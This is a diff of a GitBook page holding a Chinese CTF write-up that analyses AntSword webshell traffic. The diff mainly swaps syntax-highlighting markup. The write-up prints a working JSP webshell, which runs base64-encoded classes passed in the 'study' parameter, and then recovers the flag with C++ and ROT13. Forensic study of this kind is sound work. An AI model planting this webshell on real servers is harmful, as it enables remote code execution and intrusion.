@@ -53,10 +53,6 @@
                 
             
                 
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-prism/prism-tomorrow.css">
-                
-            
-                
                 <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-highlight/website.css">
                 
             
@@ -3273,31 +3269,31 @@
 &#x6253;&#x5F00;&#x7B5B;&#x9009;http&#x6D41;&#x91CF;&#xFF1A;
 <img src="&#x8681;&#x5251;&#x6D41;&#x91CF;/image-20240304155446822.png" alt=""></p>
 <p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5305;&#x5E76;&#x4E0D;&#x591A;&#xFF0C;&#x9010;&#x4E2A;&#x67E5;&#x770B;&#x6D41;&#x91CF;&#x5305;&#xFF0C;&#x627E;&#x5230;&#x4E00;&#x4E2A;jsp&#x811A;&#x672C;&#xFF1A;</p>
-<pre class="language-"><code class="lang-jsp">&lt;%!
-    class U extends ClassLoader {
+<pre><code class="lang-jsp">&lt;%!
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>{
         U(ClassLoader c) {
-            super(c);
+            <span class="hljs-keyword">super</span>(c);
         }
-        public Class g(byte[] b) {
-            return super.defineClass(b, 0, b.length);
+        <span class="hljs-function"><span class="hljs-keyword">public</span> Class <span class="hljs-title">g</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] b)</span> </span>{
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.defineClass(b, <span class="hljs-number">0</span>, b.length);
         }
     }
 
-    public byte[] base64Decode(String str) throws Exception {
-        try {
-            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);
-            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);
-        } catch (Exception e) {
-            Class clazz = Class.forName(&quot;java.util.Base64&quot;);
-            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);
-            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] base64Decode(String str) <span class="hljs-keyword">throws</span> Exception {
+        <span class="hljs-keyword">try</span> {
+            Class clazz = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);
+            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">byte</span>[]) clazz.getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);
+        } <span class="hljs-keyword">catch</span> (Exception e) {
+            Class clazz = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);
+            Object decoder = clazz.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>).invoke(<span class="hljs-keyword">null</span>);
+            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);
         }
     }
 %&gt;
 &lt;%
-    String cls = request.getParameter(&quot;study&quot;);
-    if (cls != null) {
-        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+    String cls = request.getParameter(<span class="hljs-string">&quot;study&quot;</span>);
+    <span class="hljs-keyword">if</span> (cls != <span class="hljs-keyword">null</span>) {
+        <span class="hljs-keyword">new</span> U(<span class="hljs-keyword">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
     }
 %&gt;
 </code></pre>
@@ -3305,52 +3301,52 @@
 &#x5728;&#x6700;&#x540E;&#x4E00;&#x4E2A;http&#x6D41;&#x91CF;&#x4E2D;&#x627E;&#x5230;flag&#x5173;&#x952E;&#x5B57;&#xFF0C;&#x4E0D;&#x8FC7;&#x662F;&#x9006;&#x5E8F;&#x7684;&#xFF1A;
 <img src="&#x8681;&#x5251;&#x6D41;&#x91CF;/image-20240304155728985.png" alt=""></p>
 <p>&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5F97;&#x5230;&#x4E00;&#x4E2A;int&#x578B;&#x6570;&#x7EC4;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x90FD;&#x662F;&#x6570;&#x5B57;&#xFF0C;&#x5E76;&#x4E14;&#x90FD;&#x5C0F;&#x4E8E;42&#xFF08;flag&#x957F;&#x5EA6;&#xFF09;&#xFF0C;&#x731C;&#x6D4B;&#x8FD9;&#x662F;flag&#x7684;&#x4E0B;&#x6807;&#xFF1A;</p>
-<pre class="language-"><code class="lang-c++">flag_index[] = {40, 17, 35, 22, 28, 26, 8, 5, 19, 13, 4, 34, 21, 12, 36, 41, 37, 42, 30, 11, 23, 16, 29, 24, 18, 31, 20, 15, 3, 25, 7, 27, 38, 14, 6, 39, 32, 33, 2, 1, 9, 10}
+<pre><code class="lang-c++">flag_index[] = {<span class="hljs-number">40</span>, <span class="hljs-number">17</span>, <span class="hljs-number">35</span>, <span class="hljs-number">22</span>, <span class="hljs-number">28</span>, <span class="hljs-number">26</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">19</span>, <span class="hljs-number">13</span>, <span class="hljs-number">4</span>, <span class="hljs-number">34</span>, <span class="hljs-number">21</span>, <span class="hljs-number">12</span>, <span class="hljs-number">36</span>, <span class="hljs-number">41</span>, <span class="hljs-number">37</span>, <span class="hljs-number">42</span>, <span class="hljs-number">30</span>, <span class="hljs-number">11</span>, <span class="hljs-number">23</span>, <span class="hljs-number">16</span>, <span class="hljs-number">29</span>, <span class="hljs-number">24</span>, <span class="hljs-number">18</span>, <span class="hljs-number">31</span>, <span class="hljs-number">20</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">25</span>, <span class="hljs-number">7</span>, <span class="hljs-number">27</span>, <span class="hljs-number">38</span>, <span class="hljs-number">14</span>, <span class="hljs-number">6</span>, <span class="hljs-number">39</span>, <span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>}
 </code></pre>
 <p>&#x4F46;&#x662F;&#x5E76;&#x672A;&#x53D1;&#x73B0;&#x5176;&#x4ED6;&#x4FE1;&#x606F;&#xFF0C;&#x7EE7;&#x7EED;&#x67E5;&#x770B;&#x6D41;&#x91CF;&#x5305;&#xFF0C;&#x627E;&#x5230;&#x5173;&#x952E;&#x4FE1;&#x606F;&#xFF1A;
 <img src="&#x8681;&#x5251;&#x6D41;&#x91CF;/image-20240304160045340.png" alt=""></p>
 <p>&#x63D0;&#x53D6;&#x51FA;&#x6765;&#x5F97;&#x5230;&#x6570;&#x7EC4;&#xFF1A;</p>
-<pre class="language-"><code class="lang-c++">flag_data[] = &quot;prsy6ppr-1qn8nq42r--20sp}7sp219to-{r57or66&quot;
+<pre><code class="lang-c++">flag_data[] = <span class="hljs-string">&quot;prsy6ppr-1qn8nq42r--20sp}7sp219to-{r57or66&quot;</span>
 </code></pre>
 <p>&#x89C2;&#x5BDF;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;<code>{}</code>&#x548C;<code>-</code>&#xFF0C;&#x5F88;&#x7B26;&#x5408;flag&#x683C;&#x5F0F;&#xFF1A;
 &#x7F16;&#x5199;&#x811A;&#x672C;&#x6062;&#x590D;flag&#x6B63;&#x786E;&#x6570;&#x636E;&#x4F4D;&#x7F6E;&#xFF1A;</p>
-<pre class="language-"><code class="lang-c++">#include<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iostream</span><span class="token punctuation">&gt;</span></span>
+<pre><code class="lang-c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span>
 
-int main()
-{
-    char flag_data[43] = &quot;prsy6ppr-1qn8nq42r--20sp}7sp219to-{r57or66&quot;;
-    int flag_index[42] = {40, 17, 35, 22, 28, 26, 8, 5, 19, 13, 4, 34, 21, 12, 36, 41, 37, 42, 30, 11, 23, 16, 29, 24, 18, 31, 20, 15, 3, 25, 7, 27, 38, 14, 6, 39, 32, 33, 2, 1, 9, 10};
-    char flag[43] = &quot;&quot;;
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
+</span>{
+    <span class="hljs-keyword">char</span> flag_data[<span class="hljs-number">43</span>] = <span class="hljs-string">&quot;prsy6ppr-1qn8nq42r--20sp}7sp219to-{r57or66&quot;</span>;
+    <span class="hljs-keyword">int</span> flag_index[<span class="hljs-number">42</span>] = {<span class="hljs-number">40</span>, <span class="hljs-number">17</span>, <span class="hljs-number">35</span>, <span class="hljs-number">22</span>, <span class="hljs-number">28</span>, <span class="hljs-number">26</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">19</span>, <span class="hljs-number">13</span>, <span class="hljs-number">4</span>, <span class="hljs-number">34</span>, <span class="hljs-number">21</span>, <span class="hljs-number">12</span>, <span class="hljs-number">36</span>, <span class="hljs-number">41</span>, <span class="hljs-number">37</span>, <span class="hljs-number">42</span>, <span class="hljs-number">30</span>, <span class="hljs-number">11</span>, <span class="hljs-number">23</span>, <span class="hljs-number">16</span>, <span class="hljs-number">29</span>, <span class="hljs-number">24</span>, <span class="hljs-number">18</span>, <span class="hljs-number">31</span>, <span class="hljs-number">20</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">25</span>, <span class="hljs-number">7</span>, <span class="hljs-number">27</span>, <span class="hljs-number">38</span>, <span class="hljs-number">14</span>, <span class="hljs-number">6</span>, <span class="hljs-number">39</span>, <span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>};
+    <span class="hljs-keyword">char</span> flag[<span class="hljs-number">43</span>] = <span class="hljs-string">&quot;&quot;</span>;
 
-    for (int i = 0; i &lt; 42; i++)
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">42</span>; i++)
     {
-        int index = flag_index[42 - (i + 1)];
-        flag[index - 1] = flag_data[i];
+        <span class="hljs-keyword">int</span> index = flag_index[<span class="hljs-number">42</span> - (i + <span class="hljs-number">1</span>)];
+        flag[index - <span class="hljs-number">1</span>] = flag_data[i];
     }
-    std::cout &lt;&lt; flag &lt;&lt; std::endl;
+    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; flag &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;
 }
-// synt{rnrrps2o-q26r-41o0-85q7-p2p69rp71p6s}
+<span class="hljs-comment">// synt{rnrrps2o-q26r-41o0-85q7-p2p69rp71p6s}</span>
 </code></pre>
 <p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x7B54;&#x6848;&#x5F88;&#x63A5;&#x8FD1;&#x4E86;&#xFF0C;&#x6839;&#x636E;&#x7ECF;&#x9A8C;&#x4E0D;&#x96BE;&#x53D1;&#x73B0;&#xFF0C;&#x6570;&#x636E;&#x662F;&#x8FDB;&#x884C;&#x4E86;&#x79FB;&#x4F4D;&#xFF0C;&#x5E76;&#x672A;&#x521A;&#x597D;13&#x4F4D;&#xFF0C;
 &#x731C;&#x6D4B;&#x662F;ROT13&#xFF1A;
 &#x7F16;&#x5199;&#x811A;&#x672C;&#x5F97;&#x5230;flag&#xFF1A;</p>
-<pre class="language-"><code class="lang-c++">//ROT13
-    for (int k = 0; k &lt; 42; k++){
-        if (flag[k] == &apos;{&apos; || flag[k] == &apos;}&apos; || flag[k] == &apos;-&apos; || (flag[k] &gt;= &apos;0&apos; &amp;&amp; flag[k] &lt;= &apos;9&apos;) )
+<pre><code class="lang-c++"><span class="hljs-comment">//ROT13</span>
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">42</span>; k++){
+        <span class="hljs-keyword">if</span> (flag[k] == <span class="hljs-string">&apos;{&apos;</span> || flag[k] == <span class="hljs-string">&apos;}&apos;</span> || flag[k] == <span class="hljs-string">&apos;-&apos;</span> || (flag[k] &gt;= <span class="hljs-string">&apos;0&apos;</span> &amp;&amp; flag[k] &lt;= <span class="hljs-string">&apos;9&apos;</span>) )
         {
-            continue;
+            <span class="hljs-keyword">continue</span>;
         }
-        else
+        <span class="hljs-keyword">else</span>
         {
-            flag[k] -= 13;
+            flag[k] -= <span class="hljs-number">13</span>;
         }
     }
-    std::cout &lt;&lt; flag;
-// flag{eaeecf2b-d26e-41b0-85d7-c2c69ec71c6f}
+    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; flag;
+<span class="hljs-comment">// flag{eaeecf2b-d26e-41b0-85d7-c2c69ec71c6f}</span>
 </code></pre>
 <p>&#x5F97;&#x5230;<code>flag{eaeecf2b-d26e-41b0-85d7-c2c69ec71c6f}</code> </p>
-<footer class="page-footer"><span class="copyright">&#x8D63;ICP&#x5907;2023008387&#x53F7;-1 &#x8D63;&#x516C;&#x7F51;&#x5B89;&#x5907;36052102100040&#x53F7; Copyright &#xA9;2022 - 2024 By Feiyu</span><span class="footer-modification">&#x6700;&#x8FD1;&#x4E00;&#x4FEE;&#x6539;&#x65F6;&#x95F4;&#xFF1A;
-2024-11-15 21:49
+<footer class="page-footer"><span class="copyright">&#x8D63;ICP&#x5907;2023008387&#x53F7;-1 &#x8D63;&#x516C;&#x7F51;&#x5B89;&#x5907;36052102100040&#x53F7; Copyright &#xA9;2022 - 2024 By Feiyu all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6700;&#x8FD1;&#x4E00;&#x4FEE;&#x6539;&#x65F6;&#x95F4;&#xFF1A;
+2025-04-06 16:47
 </span></footer>
                                 
                                 </section>
@@ -3394,7 +3390,7 @@ int main()
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"蚁剑流量","date":"2024-03-16T14:31:23.000Z","updated":"2024-11-15T21:49:39.000Z","categories":["网络安全","CTF竞赛","蓝桥杯","Misc"],"tags":["网络安全","CTF","Misc"],"permalink":"/posts/蚁剑流量/","level":"1.4.2.1.2.31","depth":5,"next":{"title":"被加密的生产流量","level":"1.4.2.1.2.32","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/被加密的生产流量.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/被加密的生产流量.md","articles":[]},"previous":{"title":"签到卡","level":"1.4.2.1.2.30","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/签到卡.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/签到卡.md","articles":[]},"dir":"ltr"},"config":{"plugins":["theme-comscore","-lunr","-search","search-pro","expandable-chapters","chapter-fold","splitter","github","page-toc-button","back-to-top-button","tbfed-pagefooter","code","accordion","prism","-sharing","sharing-plus","hide-element","umami"],"styles":{},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu","modify_label":"最近一修改时间：","modify_format":"YYYY-MM-DD HH:mm"},"page-treeview":{"copyright":"Copyright &#169; aleen42","minHeaderCount":"2","minHeaderDeep":"2"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"]},"github":{"url":"https://github.com/feiyu-195"},"umami":{"url":"https://www.feiyunote.cn:30101/random-string.js","website-id":"49159946-a785-4fe1-aaf0-a009bd825d7e"},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"hide-element":{"elements":[".gitbook-link"]},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"theme-comscore":{},"page-toc-button":{"maxTocDepth":2,"minTocSize":2},"back-to-top-button":{},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":true,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"scripts":{},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"SkyFish","language":"zh-hans","gitbook":"*","description":"这是我的简介..."},"file":{"path":"网络安全/CTF竞赛/蓝桥杯/Misc/蚁剑流量.md","mtime":"2024-11-15T13:49:40.086Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2025-04-06T08:32:22.121Z"},"basePath":"../../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"蚁剑流量","date":"2024-03-16T14:31:23.000Z","updated":"2024-11-15T21:49:39.000Z","categories":["网络安全","CTF竞赛","蓝桥杯","Misc"],"tags":["网络安全","CTF","Misc"],"permalink":"/posts/蚁剑流量/","level":"1.4.2.1.2.31","depth":5,"next":{"title":"被加密的生产流量","level":"1.4.2.1.2.32","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/被加密的生产流量.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/被加密的生产流量.md","articles":[]},"previous":{"title":"签到卡","level":"1.4.2.1.2.30","depth":5,"path":"网络安全/CTF竞赛/蓝桥杯/Misc/签到卡.md","ref":"网络安全/CTF竞赛/蓝桥杯/Misc/签到卡.md","articles":[]},"dir":"ltr"},"config":{"plugins":["theme-comscore","-lunr","-search","search-pro","expandable-chapters","chapter-fold","splitter","github","page-toc-button","back-to-top-button","tbfed-pagefooter","code","accordion","-sharing","sharing-plus","hide-element","umami"],"styles":{},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu","modify_label":"最近一修改时间：","modify_format":"YYYY-MM-DD HH:mm"},"page-treeview":{"copyright":"Copyright &#169; aleen42","minHeaderCount":"2","minHeaderDeep":"2"},"chapter-fold":{},"github":{"url":"https://github.com/feiyu-195"},"umami":{"url":"https://www.feiyunote.cn:30101/random-string.js","website-id":"49159946-a785-4fe1-aaf0-a009bd825d7e"},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"hide-element":{"elements":[".gitbook-link"]},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"theme-comscore":{},"page-toc-button":{"maxTocDepth":2,"minTocSize":2},"back-to-top-button":{},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":true,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"scripts":{},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"SkyFish","language":"zh-hans","gitbook":"*","description":"这是我的简介..."},"file":{"path":"网络安全/CTF竞赛/蓝桥杯/Misc/蚁剑流量.md","mtime":"2025-04-06T08:47:52.428Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2025-04-06T09:05:17.990Z"},"basePath":"../../../..","book":{"language":""}});
         });
     </script>
 </div>
